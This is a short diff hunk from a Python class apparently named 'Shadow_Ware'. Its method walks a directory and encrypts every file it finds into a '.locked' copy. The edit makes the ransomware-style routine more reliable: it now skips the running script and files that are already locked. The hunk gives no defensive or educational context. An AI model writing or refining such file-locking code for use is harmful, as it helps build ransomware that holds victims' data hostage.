@@ -79,7 +79,7 @@ class Shadow_Ware():
   def encrypt_all_files(self):
     files = self.get_all_files(self.current_dir)
     for file in files:
-      if file not in self.ignored_files and os.path.abspath(file) != os.path.abspath("decrypter.py"):
+      if file not in self.ignored_files and os.path.abspath(file) != os.path.abspath(__file__) and not file.endswith(".locked"):
         print("Locking file " + file)
         self.encrypt_file(file, file + ".locked")
 
